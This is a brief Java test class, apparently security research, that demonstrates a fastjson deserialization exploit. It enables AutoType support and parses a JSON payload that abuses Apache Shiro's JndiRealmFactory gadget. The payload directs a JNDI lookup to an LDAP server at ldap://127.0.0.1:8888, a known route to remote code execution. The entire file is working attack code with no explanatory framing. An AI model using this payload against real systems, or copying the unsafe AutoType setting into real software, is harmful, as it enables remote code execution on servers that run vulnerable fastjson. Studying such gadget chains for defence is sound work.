package com.mechoy;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/5/8
 * Description
 */
public class fastjsonTest1 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String s = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\",\"jndiNames\":[\"ldap://127.0.0.1:8888/BvdpLNnZ\"],\"Realms\":[]}";
        JSON.parseObject(s);
    }
}
